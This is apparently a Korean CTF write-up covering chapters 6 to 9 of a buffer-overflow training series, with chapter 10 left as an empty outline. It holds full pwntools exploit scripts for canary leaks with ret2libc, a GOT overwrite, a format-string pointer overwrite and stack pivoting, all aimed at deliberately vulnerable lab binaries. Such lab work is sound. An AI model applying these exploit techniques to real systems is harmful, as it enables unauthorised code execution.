### 조수호(shielder)

### 목차
1. Write-up (6-10)
   - Chapter 6
   - Chapter 7
   - Chapter 8
   - Chapter 9
   - Chapter 10
2. 피드백
3. 마무리

안녕하세요, Knights of the SPACE에서 활동중인 조수호(shielder)입니다. 본 글에서는 앞선 글에 이어 [Space Alone](https://github.com/hspace-io/HSPACE-LOB) Chapter6 ~ Chapter10를 풀어보겠습니다.

---
## Write-up

### Chapter 6

- 보호기법 분석
```bash
Crisis_at_the_Vault@hsapce-io:~$ checksec prob
[*] '/home/Crisis_at_the_Vault/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>

void menu(){
    puts("1. read diary");
    puts("2. write diary");
    puts("3. put down the diary");
    printf("> ");
}

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    int ch, index = 0;
    char page1[] = "As soon as I arrived here, I locked the door tightly.\nCatching my breath, it feels like a miracle that I managed to escape safely.";
    char page2[] = "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.";
    char page3[] = "I checked my weapons and packed the necessary supplies in my bag.\nAccording to rumors I heard outside, there's a vaccine at a nearby lab.";
    char page4[] = "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.";
    char page5[] = "At that moment, a zombie suddenly attacked me.\nAs I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.";
    char hidden[] = "Failed, failed, failed, failed, failed, faile... itchy, tasty";
    char* diary[] = {page1, page2, page3, page4, page5, hidden};\

	중략(출력 부분)

    while(1){
        menu();
        scanf("%d", &ch);
        if (ch == 1){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            puts(diary[index]);
        }
        else if (ch == 2){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            printf("content > ");
            read(0, diary[index], 0x100);
        }
        else if (ch == 3){
            break;
        }
    }
    puts("Ok let's go!");
    return 0;
```
모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `diary`의 내용을 출력할 수 있습니다. 2번 메뉴에서 `0x100` 바이트만큼 쓸 수 있습니다. 그런데 `page1, page2, page3, page4, page5, hidden`을 보니 `0x100` 바이트보다 적은 길이의 문자열을 담고 있어보입니다. `scp` 명령어로 파일을 꺼내 `ida`로 이어서 분석하겠습니다.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-308h] BYREF
  unsigned int v5; // [rsp+Ch] [rbp-304h] BYREF
  char *s[6]; // [rsp+10h] [rbp-300h]
  char v7[64]; // [rsp+40h] [rbp-2D0h] BYREF
  char v8[96]; // [rsp+80h] [rbp-290h] BYREF
  char v9[112]; // [rsp+E0h] [rbp-230h] BYREF
  char v10[144]; // [rsp+150h] [rbp-1C0h] BYREF
  char v11[144]; // [rsp+1E0h] [rbp-130h] BYREF
  char v12[152]; // [rsp+270h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+308h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v5 = 0;
  strcpy(
    v10,
    "As soon as I arrived here, I locked the door tightly.\n"
    "Catching my breath, it feels like a miracle that I managed to escape safely.");
  strcpy(v8, "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.");
  strcpy(
    v11,
    "I checked my weapons and packed the necessary supplies in my bag.\n"
    "According to rumors I heard outside, there's a vaccine at a nearby lab.");
  strcpy(v9, "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.");
  strcpy(
    v12,
    "At that moment, a zombie suddenly attacked me.\n"
    "As I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.");
  strcpy(v7, "Failed, failed, failed, failed, failed, faile... itchy, tasty");
  s[0] = v10;
  s[1] = v8;
  s[2] = v11;
  s[3] = v9;
  s[4] = v12;
  s[5] = v7;

후략
```
위의 코드와 비교해보면 `v12`가 `page5`와 같음을 알 수 있습니다. `v12`는 `rbp-0xa0`에 정의되어 있으므로 `bof`가 발생합니다.

- 익스플로잇 설계
카나리가 있고, 마스터 카나리를 조작하는 문제는 아니므로 카나리를 알아내야 합니다. 2번 메뉴로 `page5`(4번 인덱스)에 `0x98 + 1`(카나리의 첫 바이트는 `\x00`이기 때문에 1을 더합니다.)만큼 바이트를 입력한 후 1번 메뉴로 출력시켜 카나리를 알아냅니다.
비슷한 방법으로 `0xa8` 만큼 바이트를 입력한 후 출력시켜 `libc_base`를 알아낼 수 있습니다. `main` 함수 진행 중에 `ret` 값과 `backtrace`는 다음과 같습니다.
```
pwndbg> x/2gx $rbp
0x7fffffffe320: 0x0000000000000001      0x00007ffff7db3d90
pwndbg> backtrace
#0  0x00000000004011d8 in main ()
#1  0x00007ffff7db3d90 in __libc_start_call_main (main=main@entry=0x4011aa <main>, argc=argc@entry=1, argv=argv@entry=0x7fffffffe438) at ../sysdeps/nptl/libc_start_call_main.h:58
#2  0x00007ffff7db3e40 in __libc_start_main_impl (main=0x4011aa <main>, argc=1, argv=0x7fffffffe438, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe428) at ../csu/libc-start.c:392
#3  0x00000000004010b5 in _start ()
```
하지만 `pwndbg`는 `libc_start_call_main` 심볼을 찾지 못하기 때문에 `offset`을 직접 찾아줘야 합니다. `vmmap` 명령어를 통해 `gdb`상에서 `libc_base`를 찾을 수 있고, 두 값을 빼주면 `offset`을 구할 수 있습니다(`0x7ffff7db3d90 - 0x7ffff7d8a000 = 0x29d90`). `bof` 크기가 넉넉하기 때문에 `system('/bin/sh')`을 호출하는 방향으로 익스하겠습니다.
(ROPgadget 사용 방법은 전 포스팅 Chapter4에 소개되어 있으므로 생략하겠습니다.)

- 익스플로잇
```python
from pwn import *

p = process('./prob')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def read(idx : int) :
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()[:-1]

def write(idx : int, msg : bytes) :
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b'> ', msg)

write(4, b'a' * 0x99)
canary = u64(b'\x00' + read(4)[0x99:][:7])
print("canary = " + hex(canary))

write(4, b'a' * 0xa8)
l.address = u64(read(4)[0xa8:][:6] + b'\x00' * 2) - 0x29d90
print("libc_base = " + hex(l.address))

ret = 0x40101a
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
pop_rdi = 0x2a3e5 + l.address
payload = b'a' * 0x98 + p64(canary) + b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
write(4, payload)

p.sendlineafter(b'> ', b'3')
p.interactive()
```
저는 `/bin/sh` 문자열 찾는 방법으로 `list(l.search(b'/bin/sh'))[0]`을 선호합니다. `/bin/sh` 찾는 방법을 잘 모르셨다면 이를 추천합니다. `one_gadget`을 사용하여도 무방하지만, `vm`에 `one_gadget`이 안 깔려있는 것을 보아 인텐이 아닌 것 같아 해당 방법으로 풀지는 않았습니다.

--- 
### Chapter 7

- 보호기법 분석
```bash
[*] '/home/Wired_at_the_Vault/got'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>
/*
    HSpace Lord of the BOF
    - got
*/

unsigned long long wire[100];


void startup(){
    puts("Hope the car starts!");
    char wish[0x100];
    read(0, wish, 0x200);
}

void menu(){
    puts("1. Re-map ecu");
    puts("2. Start a car");
    puts("3. Die XD");
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    puts("Kill switch enabled");
    puts("The car won't start if the kill switch is on");
    while(1){
        int select;
        menu();
        printf("> ");
        scanf("%d", &select);
        getchar();
        if (select == 1){
            printf("number : ");
            scanf("%d", &select);
            getchar();
            printf("value : ");
            scanf("%llu", &wire[select]);
        }else if (select == 2){
            startup();
        }else{
            puts("Grrrrr....!!!");
            return 1;
        }
    }
}
```
모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴는 `wire` 배열에 접근하여 값을 쓰는 기능을 합니다. 이 때 `select`에 대한 검사가 없기 때문에 `oob` 취약점이 발생합니다. 그리고 `wire` 배열이 `bss`에 위치해있는 점, `Partial RELRO`인 점을 종합하면 `got overwrite`가 가능합니다. 2번 메뉴는 `startup` 함수를 실행합니다. `startup` 함수에서는 `bof`가 발생합니다.

- 익스플로잇 설계
카나리가 있기 때문에, 이를 알아내야 하는데 릭 벡터를 일차원적으로 찾을 수는 없습니다. 따라서 카나리를 변조해야만 다음 단계로 넘어갈 수 있습니다. 그런데 스택 프레임 내부의 카나리 값이 기존 카나리 값과 달라지면 `__stack_chk_fail` 함수를 호출합니다. 따라서 이 함수의 `got` 영역을 변조하고 의도적으로 호출하도록 설계합니다. `bof` 크기가 크기 때문에 `got overwrite`에서 체이닝을 고려할 필요는 없고 `ret` 주소로만 변조해도 충분합니다. 이러면 그냥 다음 어셈블리어 코드가 실행되므로 카나리 체크는 없는 것과 마찬가지입니다. `pop rdi ; ret` 가젯이 있기 때문에 `bof`를 이용하여 `puts`를 호출하여 `libc_base`를 얻고 `ROP`를 수행하여 `system('/bin/sh')`를 호출합니다.
이 때 `sfp`의 값을 신경써주어야 합니다. `startup` 함수를 두 번 실행하기 때문에 두 번째 함수의 `leave ; ret`에 의해 첫 번째 `payload`의 `sfp` 값이 `rsp`가 됩니다. `system` 함수는 작동 중에 쓰기 과정이 있으므로 `rsp`의 근처의 주소가 쓰기 가능한 영역이어야 합니다. 즉 `sfp`를 바른 주소로 적어주어야 합니다. `rsp`가 음수 쪽으로 쓰기 불가능한 주소와 가까이 있다면 `system` 함수가 제대로 작동하지 않을 가능성이 있으므로 보통 `e.bss() + 0x800 or 0x900`를 많이 사용합니다. 아래 코드가 이해를 도울 것입니다.

- 익스플로잇
```python
from pwn import *

p = process('./got')
e = ELF('./got')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi = 0x4011fe
ret = 0x40101a

def w1(idx : int, msg : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(msg).encode())

def w2(msg : bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'!\n', msg)

print(hex(e.bss()))
w1((e.got['__stack_chk_fail'] - e.sym['wire']) // 8, 0x40101a)
w2(b'a' * 0x110 + p64(e.bss() + 0x900) + p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts']) + p64(e.sym['startup']))
l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
print("libc_base = " + hex(l.address))

binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
p.sendafter(b'!', (b'a' * 0x110 + p64(e.bss() + 0x900) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)))
p.interactive()
```

---
### Chapter 8

- 보호기법 분석
```bash
[*] '/home/Awakening_in_the_Dark/fsb'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void open_emergency_medicine(){
        char buf[30];
        int fd = open("flag" , O_RDONLY);
        read(fd,buf,20);
        printf("%s\n",buf);
        close(fd);
}

void empty(){
        printf("There is no more medicine\n");
}
void exist(){
        printf("This medicine is located in the .fsb section.\n");
}

void init(){
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

void menu(){
        puts("1. search medicine");
        puts("2. take medicine");
        puts("3. quit");
        printf("> ");
}

int main(){
        init();
        int *exitst_or_not=(int *)exist;
        char buf[0x100];
        int num;
        puts("Welcome to BOF pharmacy");
        puts("What do you want?");
        while(1){
                menu();
                scanf("%d",&num);
                switch(num){
                        case 1:
                                memset(buf,0,0x100);
                                read(0, buf, 0x9f);
                                printf(buf);
                                if(strstr(buf, "Painkiller") || strstr(buf, "Morphine") || strstr(buf, "ibuprofen")){
                                        exitst_or_not = (int *)empty;
                                }
                                break;
                        case 2:
                                if(exitst_or_not != NULL){
                                        (*(void (*)()) exitst_or_not)();
                                }
                                else{
                                        printf("Choose medicine first\n");
                                }
                                break;
                        case 3:
                                printf("Goodbye\n");
                                return 0;
                                break;
                        default:
                                printf("Wrong input\n");
                                break;
                }

        }
        return 0;


}
```
모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `printf(buf)` 코드가 있으므로 `fsb` 취약점이 발생합니다. 2번 메뉴에서 `(*(void (*)()) exitst_or_not)();`을 실행시켜줍니다. 3번 메뉴에서 `main` 함수를 종료시킵니다. `open_emergency_medicine`를 실행하면 `flag`를 읽을 수 있습니다. `flag`에 다음 챕터로 넘어갈 때 사용할 비밀번호가 있다고 유추할 수 있습니다.

- 익스플로잇 설계
`fsb` 취약점이 존재하면 다양한 방법으로 익스가 가능합니다. 이 문제는 `printf`의 출력을 참고하여`open_emergency_medicine`을 이용하는 방법, `main`의 `RET`을 조작하는 방법이 있고, `printf`의 출력을 이용하지 않고 쉘을 따는 방법이 있습니다. 세 번째 방법은 꽤나 복잡한 과정을 거치기에 이 글에서는 소개하지 않겠습니다만, 레이팅이 높은 CTF에서도 `Medium` 난이도의 문제로 종종 출제되는 기법이기 때문에 관심이 있으시다면 익혀두시는 것을 추천합니다(2024 BackdoorCTF의 [Merry Christmas](https://shielder.tistory.com/4)문제가 예시입니다.). 여기서는 출제자의 의도를 고려하여 `open_emergency_medicine`을 이용하는 방법을 선택하겠습니다.
`fsb`가 발생하는 코드에서 `printf`가 `rdi`만 사용하므로 `rsi, rdx, r8, r9, r10, rsp, rsp + 8, rsp + 0x10...` 순서로 참조 가능합니다. 이 때 `rsi`가 `buf`의 주소를 가리키므로 `%p(혹은 %1$p)`로 `buf`의 주소를 알아낼 수 있습니다.
`exitst_or_not`을 `open_emergency_medicine`의 주소로 변경한 후 2번 메뉴로 실행시켜줄 것입니다. 이를 위해서 `exitst_or_not`의 주소를 알아야 합니다. `buf`의 주소를 알기 때문에 `exitst_or_not`과 `buf`의 `offset`만 알아내면 됩니다.
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401397 <+0>:     endbr64
   0x000000000040139b <+4>:     push   rbp
   0x000000000040139c <+5>:     mov    rbp,rsp
   0x000000000040139f <+8>:     sub    rsp,0x120
   0x00000000004013a6 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004013af <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004013b3 <+28>:    xor    eax,eax
   0x00000000004013b5 <+30>:    mov    eax,0x0
   0x00000000004013ba <+35>:    call   0x401304 <init>
   0x00000000004013bf <+40>:    lea    rax,[rip+0xffffffffffffff24]        # 0x4012ea <exist>
   0x00000000004013c6 <+47>:    mov    QWORD PTR [rbp-0x118],rax
   
   중략
   
   0x000000000040143e <+167>:   lea    rax,[rbp-0x110]
   0x0000000000401445 <+174>:   mov    edx,0x100
   0x000000000040144a <+179>:   mov    esi,0x0
   0x000000000040144f <+184>:   mov    rdi,rax
   0x0000000000401452 <+187>:   call   0x401100 <memset@plt>
   
   중략
   
   0x000000000040155a <+451>:   leave
   0x000000000040155b <+452>:   ret
End of assembler dump.
```
`init` 실행 후에 `&exist` 값을 넣어주는 것을 보아 `rbp - 0x118`이 `exitst_or_not`의 주소임을 알 수 있습니다. `memset`의 `rdi`에 `rbp-0x110`이 들어가는 것을 보아 `rbp-0x110`이 `buf`의 주소임을 알 수 있습니다. 따라서 `buf`의 주소에서 8을 빼면 `exitst_or_not`의 주소가 됩니다. 구하려고 하는 것들을 전부 구했으므로 `fsb`와 2번 메뉴를 이용해 `open_emergency_medicine`를 실행시켜 `flag`를 읽을 수 있습니다.

- 익스플로잇
```python
from pwn import *
context.arch = 'amd64'
p = process('./fsb')

def fsb(msg : bytes):
    p.sendlineafter(b'> ', b'1')
    p.send(msg + b"\n")
    return p.recvline()[:-1]

oem = 0x401256
stack = int(fsb(b"%p"), 16)
addr_exitst_or_not = stack - 8
payload = f"aa%{oem - 2}c%10$n".encode() + p64(addr_exitst_or_not)
fsb(payload)
p.sendlineafter(b'> ', b'2')
p.interactive()
```
`pwntools` 라이브러리에서 `fmtstr_payload`라는 좋은 함수를 제공하고 있습니다. 하지만 CTF나 실제 환경에서는 `payload`를 직접 작성해야 하는 경우가 많기 때문에 함수를 이용하는 것보단 직접 생각하여 짜는 것을 추천드립니다.

---
### Chapter 9

- 보호기법 분석
```bash
[*] '/home/On_the_Edge_of_Time/pivot'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
카나리가 없고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int loop = 0;

void init(){
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}


int main(void)
{
    init();
    char buf[0x30];

    printf("Hello, Sir\n");
    printf("This laboratory is currently closed.\n");
    printf("Please leave a message, and I will forward it to the person in charge of the laboratory.\n");

    if (loop)
    {
        puts("Goobye, Sir");
        exit(-1);
    }
    loop = 1;

    read(0, buf, 0x70);
    return 0;
}
```
`main`에서 `bof` 취약점이 발생합니다. 그런데 `loop` 검사가 있기 때문에 `main`은 단 한 번만 호출할 수 있습니다. `gadget` 함수에서 유용한 가젯을 제공합니다.

- 익스플로잇 설계
`libc_base`를 알아내고 `system('/bin/sh')`를 실행시키기 위해서는 한 번의 `read`만으로는 부족합니다. 심지어 `main`에서의 `read`함수는 `0x70` 바이트만 읽기 때문에 길이가 부족합니다. 따라서 스택 피보팅을 이용하겠습니다. 스택 피보팅이란 쓰기 가능한 공간에 가짜 스택 프레임이 있다고 생각하고 `payload`를 작성하는 것입니다. `sfp` 조작으로 `rbp`를 변조할 수 있고, `leave ; ret` 가젯이 있기 때문에 결국 `rsp`를 변조할 수 있어 체이닝을 이어나갈 수 있습니다. 이 문제에 적용해보면, `rdx`가 `0x70`인 상태로 `read` 함수를 다시 호출하여 `0x70` 바이트 전체를 체이닝에 사용할 수 있도록 하는 식입니다. `leave ; ret` 가젯을 이용할 것을 고려하여 가짜 스택 프레임의 구성을 생각하며 `payload`를 짜줍니다. 이 때 쓰기 가능한 공간은 `PIE`가 꺼져 있으므로 `bss` 영역을 이용합니다.

- 익스플로잇
```python
from pwn import *
from time import *

p = process('./pivot')
e = ELF('./pivot')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret = 0x40101a
pop_rdi = 0x4011e5
pop_rsi_r15 = 0x4011e7
pop_rdx = 0x4011eb
leave_ret = 0x40127b
bss = e.bss() + 0x800

payload = b'a' * 0x30 + p64(bss)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(e.sym['read']) + p64(leave_ret)
p.sendafter(b'laboratory.\n', payload)
sleep(1)

payload = p64(bss)
payload += p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(e.sym['read']) + p64(leave_ret)
p.send(payload)
sleep(1)

l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```
의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 익스 실행을 안정화시킵니다.

---
### Chapter 10

- 보호기법 분석
- 코드 분석
- 익스플로잇 설계
- 익스플로잇

---
## 피드백

5장과 6장이 매우 유사한데 둘 다 넣을 필요가 있나
심지어 5장에 canary있는데 태그에 안 적혀있음
9장 loop 체크가 밑에 있어야 스택 피보팅 의도와 어울릴 듯
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004011f0 <+0>:     endbr64
   0x00000000004011f4 <+4>:     push   rbp
   0x00000000004011f5 <+5>:     mov    rbp,rsp
   0x00000000004011f8 <+8>:     sub    rsp,0x30

   중략

   0x0000000000401260 <+112>:   lea    rax,[rbp-0x30]
   0x0000000000401264 <+116>:   mov    edx,0x70
   0x0000000000401269 <+121>:   mov    rsi,rax
   0x000000000040126c <+124>:   mov    edi,0x0
   0x0000000000401271 <+129>:   call   0x401080 <read@plt>
   0x0000000000401276 <+134>:   mov    eax,0x0
   0x000000000040127b <+139>:   leave
   0x000000000040127c <+140>:   ret
```
